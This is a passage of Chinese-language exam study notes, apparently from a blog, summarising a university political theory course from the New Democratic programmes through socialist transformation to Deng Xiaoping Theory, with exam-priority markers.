<p>（2）<strong>没收官僚资产阶级的垄断资本归新民主主义的国家所有</strong>，没收官僚资本建立起来的具有社会主义性质的国营经济。</p>
<p>（3）<strong>保护民族工商业，</strong>是新民主主义经济纲领中<strong>极具特色</strong>的一项内容<strong>。</strong>民族资本主义经济，是一种与新生产力相联系的先进的生产方式和经济成分，它对发展现代技术、发展社会生产力具有积极作用。</p>
<p>9.新民主主义的文化纲领</p>
<p>（1）新民主主义文化，就是无产阶级领导的人民大众的<strong>反帝反封建的文化</strong>，即民族的科学的大众的文化。</p>
<p>（2）<strong>民族</strong>：具有鲜明的民族风格、民族形式和民族特色。</p>
<p>（3）<strong>科学</strong>：反对一切封建思想和迷信思想，主张实事求是、客观真理及理论和实践的一致性。</p>
<p>（4）<strong>大众</strong>：是为全民族中绝大多数工人阶级和劳动群众服务的，主张文化普及于大众又提高大众，坚持为人民大众服务的方向。</p>
<h4 id="第三节-新民主主义革命的道路和基本经验"><a href="#第三节-新民主主义革命的道路和基本经验" class="headerlink" title="&amp;第三节 新民主主义革命的道路和基本经验"></a>&amp;第三节 新民主主义革命的道路和基本经验</h4><p>1.新民主主义革命的道路：走出了一条不同于俄国十月革命的道路，即<strong>农村包围城市、武装夺取政权</strong>的革命道路。</p>
<p>2.新民主主义革命道路的提出：党成立初期，首先把<strong>工作重心放在城市中</strong>，<strong>领导工人阶级</strong>，开展工人运动。</p>
<p>3.新民主主义革命道路形成必然性（了解）</p>
<p>（1）一方面，中国半殖半封，内无民主制度外无民族独立，中国革命主要斗争形式只能是武装斗争。</p>
<p>（2）另一方面，近代中国是一个农业大国，农民占人口大多数，是无产阶级可靠的同盟军和革命主力军，要充分发动农民力量。</p>
<p>（3）最后实现的几个方面：</p>
<p>①社会政治经济发展极端不平衡（提供可能）</p>
<p>②近代中国广大农村深受反动统治阶级多重压迫剥削，人民革命意愿强（群众基础）</p>
<p>③全国革命形势继续向前发展</p>
<p>④相当力量正式红军存在</p>
<p>⑤党的领导的有力量及其政策的不错误（主观条件）</p>
<p>4.新民主主义革命道路的内容及意义</p>
<p>（1）根本在于处理好<strong>土地革命、武装斗争、农村革命</strong>根据地建设三者之间的关系。</p>
<p>（2）<strong>土地革命是中国革命的基本内容</strong>，<strong>武装斗争是中国革命的主要形式</strong>，是农村根据地建设和土地革命的强有力保证；农村革命根据地是中国革命的战略阵地，是进行武装斗争和开展土地革命的依托。</p>
<p>5.新民主主义革命的<strong>三大法宝</strong>（基本经验）</p>
<p>毛泽东在《&lt;共产党人&gt;发刊词》一文中，提出了<strong>统一战线、武装斗争、党的建设</strong>是党在中国革命种战胜敌人的<strong>三个主要的法宝。</strong></p>
<ul>
<li><strong>统一战线</strong></li>
</ul>
<p>（1）建立统一战线的依据</p>
<p>①首先是由中国半殖民地半封建社会的阶级情况所决定的。</p>
<p>②其次是由中国革命的长期性、残酷性及其发展的不平衡性所决定的。</p>
<p>（2）党领导的革命统一战线，包含着两个联盟：</p>
<p>①工农联盟②工人阶级和非劳动人民的联盟，主要是与民族资产阶级的联盟</p>
<p>（3）抗日民族统一战线</p>
<ul>
<li><strong>武装斗争</strong></li>
</ul>
<p>（1）要坚持党对军队的绝对领导（2）要建设全心全意为人民服务的人民军队</p>
<p>（3）要开展革命的政治工作（4）要坚持正确的战略战术原则</p>
<ul>
<li><strong>党的建设</strong></li>
</ul>
<p>（1）必须把<strong>思想建设</strong>始终放在党的建设的首位</p>
<p>（2）必须在任何时候都重视党的组织建设，<strong>要贯彻民主集中制</strong></p>
<p>（3）必须重视党的作风建设，形成<strong>理论联系实际、密切联系群众、批评与自我批评相结合</strong>的三大优良作风</p>
<p>（4）必须联系<strong>党的政治路线</strong>加强党的建设</p>
<ul>
<li><strong>三大法宝之间的关系</strong></li>
</ul>
<p><strong>统一战线和武装斗争是中国革命的两个基本特点</strong>，是战胜敌人的两个基本武器。统一战线是实行武装斗争的统一战线，武装斗争是统一战线的中心支柱，党的组织则是掌握统一战线和武装斗争这两个武器以实行对地冲锋陷阵的英勇战士。</p>
<h3 id="第三章-社会主义改造理论"><a href="#第三章-社会主义改造理论" class="headerlink" title="第三章 社会主义改造理论"></a>第三章 社会主义改造理论</h3><h4 id="第一节-从新民主主义到社会主义的转变"><a href="#第一节-从新民主主义到社会主义的转变" class="headerlink" title="第一节 从新民主主义到社会主义的转变"></a>第一节 从新民主主义到社会主义的转变</h4><p>1.新民主主义社会是一个过渡性的社会</p>
<p>（1）从中华人民共和国成立到社会主义改造基本完成，是我国从<strong>新民主主义到社会主义</strong>的过渡时期。这一时期，我国社会的性质是新民主主义社会。（单选）</p>
<p>（2）新民主主义社会存在五种经济成分：社会主义性质的国营经济、半社会主义性质的合作社经济、农民和手工业者的个体经济、私人资本主义经济、国家资本主义经济。（了解即可）</p>
<p>（3）主要经济成分有三种：社会主义经济、个体经济、资本主义经济</p>
<p>（4）中国社会阶级构成主要为：工人阶级、农民阶级和其他小资产阶级、民族资产阶级等基本阶级力量</p>
<p>（5）随着土地改革的基本完成，<strong>工人阶级和资产阶级的矛盾逐步成为我国社会主要矛盾（重要！）</strong></p>
<p>2.党在过渡时期总路线的提出</p>
<p>（1）1949年3月，党的七届二中全会提出使中国”稳步地由农业国转为工业国，由新民主主义国家转变为社会主义国家“，<strong>即”两个转变“同时并举的思想。</strong></p>
<p>（2）党内大体形成了先用三个五年计划的时间搞工业化建设，再向社会主义过渡的共识。</p>
<p>（3）党在这个过渡时期的总路线和总任务：是要在一个相当长的时期内，<strong>逐步实现国家的社会主义工业化</strong>，并逐步实现国家<strong>对农业、对手工业和资本主义工商业的社会主义改造。（重要！）</strong></p>
<p>（4）要从根本上改变中国贫穷落后的面貌，把中国从一个落后的农业国变为一个先进的工业国，就必须实现国家的工业化。当时中国具体条件下<strong>必须实现社会主义工业化。</strong></p>
<p>（5）从历史上看，实现工业化有两条道路：<strong>一条是资本主义工业化道路，一条是社会主义工业化道路。</strong>因此，在20世纪50年代中期实现国家工业化道路的选择上，中国不可能选择资本主义道路，<strong>而只能是选择社会主义道路。</strong>中国实现工业化只能主要依靠内部积累，使我国有强大的重工业可以制造各种必要的工业装备。</p>
<p><strong>（6）（重要重要！！！简答、选择）</strong>党在过渡时期总路线主要内容被概括为<strong>“一化三改”</strong>。</p>
<p>a.<strong>一化是主体，三改是两翼。两者相辅相成，相互促进。</strong>这是一条社会主义改造<strong>同时并举</strong>的路线</p>
<p>b.体现了解放生产力与发展生产力，变革生产关系与发展生产力的有机统一</p>
<h4 id="第二节-社会主义改造道路和历史经验"><a href="#第二节-社会主义改造道路和历史经验" class="headerlink" title="&amp;第二节 社会主义改造道路和历史经验"></a>&amp;第二节 社会主义改造道路和历史经验</h4><p>1.农业、手工业的社会主义改造</p>
<p>（1）对农业的社会改造，是三大改造中首先进行的。</p>
<p>（2）第一，积极引导<strong>农民组织起来，走互助合作道路</strong>（合作社方式）。</p>
<p>（3）第二，<strong>遵循自愿互利，</strong>典型示范和国家帮助的原则，<strong>以互助合作的优越性</strong>吸引农民走互助合作道路。</p>
<p>（4）第三，正确分析农村的阶级和阶层状况，<strong>制定正确的阶级政策</strong>。在此基础上，党制定并贯彻执行了依靠贫下中农，发展互助合作。</p>
<p>（5）第四，<strong>坚持积极领导，稳步前进的方针，采取循序渐进</strong>的步骤。</p>
<p>2.资本主义工商业的社会主义改造</p>
<p>（1）第一，<strong>用和平赎买的方法改造资本主义工商业</strong>。所谓赎买，就是国家有偿<strong>地将私营企业改变为国营企业</strong>，<strong>将资本主义私有制改变为社会主义公有制。</strong>赎买的具体方式不是由国家支付一笔巨额补偿资金，<strong>而是让资本家在一定年限内从企业经营所得中获取一部分利润。</strong></p>
<p>（2）第二，<strong>采取从低级到高级国家资本主义的过渡形式。</strong>所谓国家资本主义，就是<strong>在国家直接控制和支配下的资本主义经济。</strong></p>
<p>a.初级形式的国家资本主义是<strong>国家对私营工商业实行委托加工、计划订货、统购包销、经销代销等</strong>，高级形式的国家资本主义<strong>是公私合营</strong>，包括个别企业的公私合营和全行业的公私合营。</p>
<p>b.这些企业的利润，<strong>按国家所得税、企业公积金、工人福利费、资方红利</strong>这四个方面进行分配，<strong>即“四马分肥”。（重要！）</strong>资方红利大体占1&#x2F;4。</p>
<p>（3）第三，把资本主义工商业改造成自食其力的社会主义劳动者。国家对资方在职人员和资方代理人采取“包下来”政策，以企业为基地，根据“量才使用，适当照顾”的原则，对他们在政治上适当安排、工作上发挥作用、生活上妥善照顾。</p>
<p><strong>3.社会主义改造的历史经验（非常重要！）</strong></p>
<p>（1）第一，坚持<strong>社会主义工业化建设与社会主义改造同时并举。</strong></p>
<p>（2）第二，<strong>采取积极引导，逐步过渡的方式。</strong></p>
<p>（3）第三，<strong>用和平方法进行改造。</strong></p>
<h4 id="第三节-社会主义基本制度在中国的确立"><a href="#第三节-社会主义基本制度在中国的确立" class="headerlink" title="第三节 社会主义基本制度在中国的确立"></a>第三节 社会主义基本制度在中国的确立</h4><p>1.社会主义基本制度的确立及其理论依据</p>
<p>（1）1956年底，我国对农业、手工业和资本主义工商业的社会主义改造基本完成。</p>
<p>（2）社会主义公有制已成为我国社会的经济基础，标志着社会主义基本制度的确立。</p>
<p>2.确立社会主义基本制度的重大意义</p>
<p>（1）社会主义基本制度的确立是<strong>中国历史上最深刻最伟大的社会变革。</strong></p>
<p>（2）社会主义基本制度的确立，<strong>为当代中国一切发展进步奠定了制度基础</strong>。社会主义制度的建立极大地<strong>提高了工人阶级和广大劳动人民的积极性、创造性，极大地促进了我国生产力</strong>的发展。（经济意义）</p>
<p>（3）社会主义基本制度的确立，<strong>使广大劳动人民真正成为国家的主人。</strong>这是中国几千年来阶级关系的<strong>最根本变革，</strong>极大地巩固和扩大了<strong>工人阶级领导的、以工农联盟为基础的人民民主专政国家政权的阶级基础和经济基础。</strong>（政治意义）</p>
<p>（3）中国社会主义基本制度的确立，使占全世界人口1&#x2F;4的东方大国<strong>进入了社会主义社会</strong>，这是<strong>世界社会主义发展史上又一个历史性的伟大胜利。</strong>（世界意义）</p>
<p>（4）社会主义基本制度的确立，是以<strong>毛泽东同志为主要代表的中国共产党人对一个脱胎于半殖民地半封建的东方大国如何进行社会主义革命问题的系统回答和正确解决，是马克思列宁主义关于社会主义革命理论在中国的正确运用和创造性发展的结果。</strong>（思想理论意义）</p>
<p><em>“三线建设”，是20世纪60-70年代我国*<em>以加强国防为中心的战略大后方建设。</em></em></p>
<h3 id="第四章-社会主义建设道路初步探索的理论成果"><a href="#第四章-社会主义建设道路初步探索的理论成果" class="headerlink" title="第四章 社会主义建设道路初步探索的理论成果"></a>第四章 社会主义建设道路初步探索的理论成果</h3><h4 id="第一节-初步探索的重要理论成果"><a href="#第一节-初步探索的重要理论成果" class="headerlink" title="第一节 初步探索的重要理论成果"></a>第一节 初步探索的重要理论成果</h4><p>1.知识点</p>
<p>（1）1956年，两篇文章。要求马列主义基本原理同中国具体实际进行”第二次结合“</p>
<p>（2）毛泽东在中央政治局扩大会议和最高国务会议上，作了《论十大关系》的报告。初步总结了我国社会主义建设的经验，明确提出要以苏为鉴，独立自主地探索适合中国情况的社会主义建设道路。《论十大关系》标志着党探索中国社会主义建设道路的良好开端。</p>
<p>（3）《论十大关系》确定了一个基本方针，就是“努力把党内党外、国内国外的一切积极的因素，直接的、间接的积极因素，全部调动起来“，为社会主义建设服务。</p>
<p>2.正确认识和处理社会主义社会矛盾的思想</p>
<p>（1）党在八大前后，特别是毛泽东在1957年2月所作的<strong>《关于正确处理人民内部矛盾的问题》</strong>的报告，系统论述了<strong>社会主义社会矛盾的理论。（单选）</strong></p>
<p>（2）关于<strong>社会主义社会的基本矛盾</strong>。毛泽东指出仍然是<strong>生产关系和生产力之间的矛盾，上层建筑和经济基础之间的矛盾。（单选）</strong></p>
<p>3.我国社会的主要矛盾和根本任务</p>
<p>（1）我们国内的主要矛盾已经不再是工人阶级和资产阶级的矛盾，而是人民对于经济文化迅速发展的需要同当前经济文化不能满足人民需要的状况之间的矛盾。据此，党中央提出，<strong>全国人民主要任务是集中力量发展社会生产力。</strong></p>
<p>（2）社会主义社会两类不同性质的矛盾：<strong>敌我矛盾（对抗性矛盾）、人民内部矛盾（是非对抗性的矛盾）。</strong></p>
<p>4.正确处理基本方法</p>
<p>（1）在人民民主专政下面：<strong>专政</strong>方法</p>
<p>（2）正确处理人民内部矛盾方针：毛泽东指出。用<strong>民主方法</strong>解决人民内部矛盾，这是一个总方针。（单选）</p>
<p>（3）毛泽东提出了一系列具体方针、原则：对于<strong>政治思想领域</strong>的人民内部矛盾，实行<strong>“团结-批评-团结”</strong>的方针。对于<strong>科学文化领域</strong>的矛盾，实行<strong>“百花齐放，百家争鸣”</strong>的方针，对于<strong>共产党和民主党派</strong>的矛盾，实行在<strong>坚持社会主义道路和共产党领导的前提下“长期共存，互相监督”</strong>的方针。</p>
<p>（4）毛泽东强调，<strong>关于正确处理人民内部矛盾的问题</strong>是社会主义国家政治生活的主题。</p>
<p>5.走中国工业化道路的思想</p>
<p>（1）中国工业化的提出：毛泽东在《论十大关系》中论述的第一大关系，<strong>便是重工业和轻工业、农业的关系。在《关于正确处理人民内部矛盾的问题》中，毛泽东明确提出了中国工业化道路的问题（单选），主要是指重工业和轻工业、农业的发展关系问题，强调要走一条有别于苏联的中国工业化道路。</strong></p>
<p><strong>（2）中国工业化道路的内涵：毛泽东提出了以农业为基础，以工业为主导，以农轻重为序发展国民经济的总方针，以及一整套“两条腿走路”的工业化发展道路，即重工业和轻工业同时并举，中央工业和地方工业同时并举，沿海工业和内地工业同时并举，大型企业和中小型企业并举。（重点！！！）</strong></p>
<p>6.如何走中国工业化道路</p>
<p>（1）走中国工业化道路，必须采取正确的<strong>经济建设方针</strong>。<strong>党的八大提出了既反保守又反冒进、坚持在综合平衡中稳步前进的方针。</strong>毛泽东多次阐述了统筹兼顾的方针。</p>
<p>（2）走中国工业化道路，必须调整调整和<strong>完善所有制结构。</strong>毛泽东、刘少奇、周恩来提出了把<strong>资本主义经济作为社会主义经济的补充的思想。</strong>陈云提出了“三个主义，三个补充”的设想。</p>
<p>（3）走中国工业化道路，必须积极探索适合我国情况的<strong>经济体制和运行机制。</strong>毛泽东还主张企业要建立合理的规章制度和严格的责任制，要实行民主管理，实行干部参加劳动，工人参加管理，改革不合理的规章制度，工人群众、干部领导和技术人员三结合，<strong>即“两参一改三结合”。</strong></p>
<p>7.四个现代化战略目标与步骤</p>
<p>（1）1954年9月，<strong>周恩来在一届全国人大一次会议第一次提出关于“四个现代化”的构想。</strong></p>
<p>（2）毛泽东指出建设社会主义。原来要求是<strong>工业现代化，农业现代化，科学文化现代化，现在要加上国防现代化。</strong>这样就形成了“四个现代化”战略目标的完整提法。</p>
<p>8.其他理论成果</p>
<p>（1）在科技工作方面，我们党提出了<strong>“向科学进军”</strong>的口号，强调实现“四个现代化”<strong>关键在于科学技术现代化。（单选）</strong></p>
<p>（2）周恩来提出了知识分子中绝大部分是工人阶级一部分的观点</p>
<p>（3）关于国防建设。三线建设，是20世纪6070年代我国以加强国防为中心的战略大后方建设。</p>
<h4 id="第二节-初步探索的意义和经验教训（重点，简答题）"><a href="#第二节-初步探索的意义和经验教训（重点，简答题）" class="headerlink" title="第二节 初步探索的意义和经验教训（重点，简答题）"></a>第二节 初步探索的意义和经验教训（重点，简答题）</h4><p><strong>1.初步探索的意义（重点）</strong></p>
<p>（1）第一，巩固和发展了我国的社会主义制度。</p>
<p>（2）第二，为开创中国特色社会主义提供了宝贵经验、理论准备、物质基础。在这一探索过程中，我国建立起独立的比较完整的工业体系和国民经济体系。我国经济保持了较快的发展速度，经济实力显著增强，从根本上解决了工业化“从无到有”的问题。农业生产条件显著改变，教育、科学、文化、卫生、体育事业有很大发展。“两弹一星”等国防尖端科技不断取得突破。</p>
<p>（3）第三，丰富了科学社会主义的理论和实践。</p>
<p><strong>2.初步探索的经验教训（重点）</strong></p>
<p><strong>（1）第一，必须把马克思主义与中国实际相结合，探索符合中国特点的社会主义建设道路。</strong></p>
<p><strong>（2）第二，必须正确认识社会主义社会的主要矛盾和根本任务，集中力量发展生产力。</strong>党对我国社会的主要矛盾有了较为正确的认识，党的八大二次会议改变了党的八大关于我国社会主要矛盾的正确判断，错误地认为在社会主义社会建成以前，无产阶级与资产阶级的矛盾，社会主义道路与资本主义道路的矛盾，始终是我国社会的主要矛盾。</p>
<p><strong>（3）第三，必须从实际出发进行社会主义建设，建设规模和速度要与国力相适应，不能急于求成。</strong></p>
<p><strong>（4）第四，必须发展社会主义民主，健全社会主义法制。</strong></p>
<p><strong>（5）第五，必须坚持党的民主集中制和集体领导制度，加强执政党建设。</strong></p>
<p><strong>（6）第六，必须坚持对外开放，借鉴和吸收人类文明成果建设社会主义，不能关起门来搞建设。</strong></p>
<h3 id="第五章-中国特色社会主义理论体系的形成发展"><a href="#第五章-中国特色社会主义理论体系的形成发展" class="headerlink" title="第五章 中国特色社会主义理论体系的形成发展"></a>第五章 中国特色社会主义理论体系的形成发展</h3><h4 id="第一节-中国特色社会主义理论体系形成发展的社会历史条件"><a href="#第一节-中国特色社会主义理论体系形成发展的社会历史条件" class="headerlink" title="第一节 中国特色社会主义理论体系形成发展的社会历史条件"></a>第一节 中国特色社会主义理论体系形成发展的社会历史条件</h4><p>（社会历史条件三个角度：国际背景，国内背景，党的实践基础）</p>
<p>1.形成国际背景</p>
<p>*20世纪70年代整个世界发生着大变动大调整，这种变动调整的剧烈和深刻程度远远超出了人们的预料。最显著的变化，就是和平与发展成为时代主题，世界多极化和经济全球化深入发展，综合国力竞争日趋激烈。</p>
<p>（1）一方面，西方资本主义遭遇严重经济危机。美苏两极对抗的冷战格局出现重大变化，世界上各种力量出现新的分化和组合。</p>
<p>（2）另一方面，新科技革命推动下的经济社会快速发展使各国人民更加珍惜发展的机遇，求发展的愿望更加强烈。经济全球化深入发展促使世界各国经济日益紧密联系在一起。</p>
<p>2.党的十八大以来变局</p>
<p><em>党的十八大以来世界之变、时代之变、历史之变正以前所未有的方式展开，*<em>世界百年未有之大变局加速演进。</em></em></p>
<p>（1）国际力量对比正在发生近代以来最具革命性的变化。</p>
<p>（2）与此同时世纪疫情影响深远，逆全球化思潮抬头，单边主义、保护主义明显上升，世界经济复苏乏力，局部冲突和动荡频发，全球性问题加剧，人类面临许多共同挑战，治理赤字、信任赤字、发展赤字、和平赤字等问题越来越严重，<strong>世界进入新的动荡变革期。</strong></p>
<p><strong>3.历史条件（国内背景）</strong></p>
<p><strong>（1）邓小平理论</strong></p>
<p>a.背景：社会主义基本制度建立后，如何在中国这样一个经济文化比较落后的东方大国建设社会主义，成为我们党面临的一个崭新课题。</p>
<p>b.党的十一届三中全会以后，以邓小平同志为主要代表的中国共产党人，领导全党和全国人民，果断地纠正了这些错误，深刻地分析了错误出现的原因，同时又坚决地维护和继承了过去在理论上和实践上所取得的一切成果，鲜明指出建设社会主义没有固定的模式，必须结合中国实际，<strong>在实践中不懈探索和回答什么是社会主义、怎样建设社会主义这一基本问题。（大题，选择题）</strong>正是在探索和回答这一首要的基本的理论问题的过程中，我们党开创了中国特色社会主义的伟大事业。</p>
<p><strong>（2）三个代表</strong></p>
<p>a.背景：20世纪80年代末90年代初，国外发生苏东剧变，国内发生严重政治风波，世界社会主义出现严重曲折，我国社会主义事业的发展面临新的巨大困难和压力。党的阶级基础在增强，群众基础在扩大。尽管党的干部队伍总体是好的，但在一些党员和干部中，还存在着不同程度的思想僵化、信念动摇、道德滑坡、组织涣散现象，在党员领导干部中违法乱纪、腐化堕落案件时有发生。<strong>进一步提高党的领导水平和执政水平，提高拒腐防变和抵御风险的能力，是我们党必须解决好的两大历史性课题。（单选）</strong></p>
<p>b.以江泽民同志为主要代表的中国共产党人科学判断党的历史方位、深刻总结历史经验，<strong>创造性地回答了“建设什么样的党、怎样建设党”这一重大问题。（单选）</strong></p>
<p><strong>（3）科学发展观</strong></p>
<p>a.背景：新世纪新阶段，我国经济社会发展取得了举世瞩目的成就，<strong>但我国仍处于并将长期处于社会主义初级阶段的基本国情没有变。我国进入发展关键期、改革攻坚期和矛盾凸显期（三期叠加）</strong>，经济社会发展呈现一些列新的阶段性特征。</p>
<p>b.以胡锦涛同志为主要代表的中国共产党人，在深刻把握我国基本国情和经济社会发展新的阶段性特征的基础上，<strong>创造性地回答了“实现了什么样的发展、怎样发展”这一重大问题。（单选）</strong></p>
<p><strong>（4）习近平新时代中国特色社会主义思想</strong></p>
<p>a.背景：党的十八大以来，<strong>中国特色社会主义进入新时代，这是我国发展新的历史方位。</strong></p>
<p>b.以习近平同志为核心的党中央，准确把握中国特色社会主义进入新时代这一我国发展新的历史方位，从新的实际出发，深邃思考和分析关系新时代党和国家事业发展的一系列重大理论和实践问题，<strong>科学回答新时代坚持和发展什么样的中国特色社会主义、怎样坚持和发展中国特色社会主义，建设什么样的社会主义现代化强国、怎样建设社会主义现代化强国，建设什么样的长期执政的马克思主义政党、怎样建设长期执政的马克思主义政党等重大时代课题。（单选）</strong></p>
<h4 id="第二节-中国特色社会主义理论体系形成发展过程"><a href="#第二节-中国特色社会主义理论体系形成发展过程" class="headerlink" title="第二节 中国特色社会主义理论体系形成发展过程"></a>第二节 中国特色社会主义理论体系形成发展过程</h4><p>1.中国特色社会主义理论体系的形成背景</p>
<p>（1）“文化大革命”结束后，“中国向何处去”成为摆在中国人民面前头等重要的问题。邓小平强调实事求是是毛泽东思想的精髓，旗帜鲜明反对“两个凡是”的错误观点，支持和领导开展真理标准问题的讨论，推动进行各方面的拨乱反正。</p>
<p><strong>（2）（重点！）党的十一届三中全会，重新确立了实事求是的思想路线，彻底否定了“以阶级斗争为纲”的错误理论和实践，确定把全党工作的着重点转移到社会主义现代化建设上来，作出实行改革开放的重大决策，实现了党的历史上具有深远意义的伟大转折。</strong></p>
<p>2.真理标准问题大讨论</p>
<p>1978年5月10日，《实践是检验真理的唯一标准》首先在中共党校内部刊物《理论动态》第60期上发表。5月11日《光明日报》以特约评论员名义公开发表这篇文章。</p>
<p>3.中国特色社会主义理论体系的形成——邓小平理论</p>
<p>（1）1982年邓小平在<strong>党的十二大（会考）</strong>开幕词中明确提出：<strong>走自己的道路，建设有中国特色的社会主义。</strong>至此“中国特色社会主义”成为我们党的全部理论和实践创新的主题。这一重大命题的提出具有里程碑意义，是中国共产党人对科学社会主义发展的开创性贡献。</p>
<p>（2）从党的十二大到十三大，1984年<strong>党的十二届三中全会作出了《中共中央关于经济体制改革的决定》（会考）</strong>，提出了社会主义经济是在公有制基础上的有计划的商品经济。此后由经济体制改革到各方面体制改革，<strong>首次确认了商品经济在社会主义中国的地位。</strong></p>
<p>（3）1987年召开的党的十三大，<strong>第一次比较系统地论述了我国社会主义初级阶段理论</strong>，明确概括和全面阐发了党的：一个中心、两个基本点“的基本路线，从马克思主义哲学、政治经济学和科学社会主义等方面，<strong>第一次对中国特色社会主义理论的主要内容作了系统概括</strong>，<strong>也标志着邓小平理论轮廓的形成。1987.10~11党的十三大召开，第一次使用”私营经济“概念。</strong></p>
<p>（4）1997年召开的党的十五大正式提出“邓小平理论”这一概念，党的十五大郑重地把邓小平理论 同马克思列宁主义、毛泽东思想一起，确立为党的指导思想并写入党章。</p>
<p>4.中国特色社会主义理论体系的跨世纪发展——三个代表</p>
<p>（1）“三个代表”重要思想。2000年2月25日，江泽民在广东考察工作时，从全面总结党的历史经验和如何适应新形势新任务的要求出发，首次对“三个代表”进行了 比较全面的阐述。</p>
<p>（2）同年6月9日，江泽民在全国党校工作 会议上第一次指出，“三个代表”重要思想所要回答和解决的正是“建设什么样的党、怎样建设党”的重大问题。</p>
<p>（3）2001年7月1日，江泽民在庆祝中国共产党成立八十周年大会上 的讲话中全面阐述了“三个代表”重要思想的科学内涵和基本内容。</p>
<p>（4）2002年11月，党的十六大全面阐述了“三个代表”重要思想形成的时代背景、历史地位、精神实质和指导意义，<strong>将“三个代表”重要思想同马克思列宁主义、毛泽东思想和邓小平理论一道确立为党必须长期坚持的指导思想，并写入党章。</strong></p>
<p>5.中国特色社会主义理论体系在新世纪新阶段的新发展——科学发展观</p>
<p>（1）科学发展观在<strong>抗击非典疫情和探索完善社会主义市场</strong>经济体制的过程中逐步形成。</p>
<p>（2）2003年初，集中暴露出我国经济社会发展中存在的<strong>薄弱环节和突出问题。</strong></p>
<p>（3）2003年10月，党的十六届三中全会通过的《中共中央关于完善社会主义市场经济体制若干问题的决定》，这是我们党的文件中第一次提出科学发展观。</p>
<p>（4）2007年，党的十七大对科学发展观的<strong>理论定位、理论依据、理论内涵</strong>作了全面阐述。</p>
<p>（5）（重要！）<strong>党的十七大把科学发展观写入党章，科学发展观进一步走向成熟。党的十七大同时提出中国特色社会主义理论体系。</strong></p>
<p>（6）党的十七大后，来自国际国内经济政治以及自然界的严重困难和挑战接连不断，其中对我国经济社会发展冲击最猛烈、持续时间最长、影响最为深远的是美国次贷危机引发的<strong>国际金融危机（2008）</strong>。这一进程最显著的成果，是<strong>加快转变经济发展方式</strong>的战略思想和举措。 </p>
<p>（7）<strong>党的十八大</strong>进一步把科学发展观确立为党必须<strong>长期坚持的指导思想。</strong></p>
<h3 id="第六章-邓小平理论"><a href="#第六章-邓小平理论" class="headerlink" title="第六章 邓小平理论"></a>第六章 邓小平理论</h3><h4 id="第一节-邓小平理论首要的基本的理论问题和精髓"><a href="#第一节-邓小平理论首要的基本的理论问题和精髓" class="headerlink" title="第一节 邓小平理论首要的基本的理论问题和精髓"></a>第一节 邓小平理论首要的基本的理论问题和精髓</h4><p>1.邓小平理论首要的基本的理论问题<strong>（社会主义的本质理论）</strong></p>
<p>（1）在中国这样一个经济文化比较落后的国家建设什么样的社会主义、怎样建设社会主义是一个首要的基本的理论问题。</p>
<p>（2）1992年初，邓小平在<strong>南方谈话（重点记住）</strong>中对社会主义本质作出了总结性的理论概括，<strong>社会主义的本质：解放生产力、发展生产力、消灭剥削、消除两极化、最终达到共同富裕。（会考）</strong></p>
<p>（3）邓小平对社会主义本质的概括，既包括了社会主义社会的生产力问题，又包括了社会主义社会的生产关系问题，是一个<strong>有机的载体。</strong></p>
<p>（4）首先，它突出地强调解放和发展生产力在社会主义社会发展中的重要地位，反映了中国社会主义整个历史阶段尤其是初级阶段特别需要注意生产力发展的迫切要求。</p>
<p>（5）其次，它突出地强调“消灭剥削，消除两极分化，最终达到共同富裕”，从生产关系和发展目标角度认识和把握社会主义本质。</p>
<p>（6）社会主义本质提出的意义：<strong>（大题）继承了科学社会主义的基本原则、反映了人民的利益和时代的要、深化了对科学社会主义的认识、推进了改革开放的伟大实践</strong></p>
<p>2.邓小平理论的精髓</p>
<p><strong>（1）解放思想，实事求是，</strong>是邓小平理论的<strong>精髓</strong>。</p>
<p>（2）党的思想路线的重新确立，解决了一些列重大理论和实践问题。邓小平在为这次全会做准备的中央工作会议上发表了《解放思想，实事求是，团结一致向前看》的重要讲话，标志着党重新确立了马克思主义的思想路线、政治路线和组织路线。</p>
<p><strong>（3）党的思想路线的重新确立的意义：（大题）</strong></p>
<p><strong>a.有力推动和保证了拨乱反正的进行</strong></p>
<p><strong>b.破除了僵化的社会主义模式观念，坚持走自己的路</strong></p>
<p><strong>c.一切从社会主义初级阶段的实际出发</strong></p>
<p><strong>d.坚持以“三个有利于”作为检验一切工作是非得失的根本标准</strong></p>
<h4 id="第二节-邓小平理论的主要内容"><a href="#第二节-邓小平理论的主要内容" class="headerlink" title="&amp;第二节 邓小平理论的主要内容"></a>&amp;第二节 邓小平理论的主要内容</h4><h5 id="一、社会主义初级阶段理论（总依据理论）"><a href="#一、社会主义初级阶段理论（总依据理论）" class="headerlink" title="一、社会主义初级阶段理论（总依据理论）"></a>一、社会主义初级阶段理论（总依据理论）</h5><p>*<em><strong>社会主义初级阶段理论</strong></em></p>
<p>1.社会主义初级阶段理论概述</p>
<p>（1）正确认识党和人民事业所处的历史方位和发展阶段，是我们党明确阶段性中心任务、制定路线方针政策的根本依据</p>
<p>（2）以邓小平同志为主要代表的中国共产党人作出我国正处于并将长期处于社会主义初级阶段的重大判断</p>
<p><strong>（3）我国最大国情、最大的实际是还处在社会主义初级阶段（社会主义初级阶段基本国情——自我定位）</strong></p>
<p>（4）党的十一届六中全会通过<strong>《中国共产党中央委员会关于建国以来党的若干历史问题的决议》提出“我们的社会主义制度还是处于初级阶段”</strong></p>
<p><strong>2.（重点，大题）党的十三大系统阐述了社会主义初级阶段的科学内涵</strong></p>
<p>（1）首先，<strong>阐明了社会主义初级阶段这个论断包括两层含义。</strong></p>
<p>a.第一，我国社会已经是社会主义社会。<strong>我们必须坚持而不能离开社会主义。</strong></p>
<p>b.第二，<strong>我国的社会主义社会还处在初级阶段。</strong>我们必须<strong>从这个实际出发，而不能超越这个阶段。</strong></p>
<p>（2）<strong>其次，强调了社会主义初级阶段的长期性。（1956~本世纪中叶）</strong>我国社会主义的初级阶段，<strong>不是泛指任何国家进入社会主义都会经历的起始阶段，而是特指我国在生产力落后、商品经济不发达条件下建设社会主义必然要经历的特定阶段。</strong></p>
<p>（3）<strong>最后，阐述了社会主义初级阶段的基本特征。</strong>1997年9月，党的十五大又进一步概括了社会主义初级阶段的特征，强调现在处于并将长时期处于社会主义初级阶段是中国最大的实际。</p>
<p>3.社会主义初级阶段理论意义</p>
<p>（1）社会主义初级阶段理论<strong>基于对中国国情的准确把握，揭示了当代中国的历史方位</strong></p>
<p>（2）是对马克思主义<strong>关于社会主义发展阶段理论的重大发展和重大突破</strong></p>
<p>（3）为建设中国特色社会主义<strong>提供了总依据</strong></p>
<p>*<em><strong>党在社会主义初级阶段的基本路线</strong></em></p>
<p>4.基本路线概述</p>
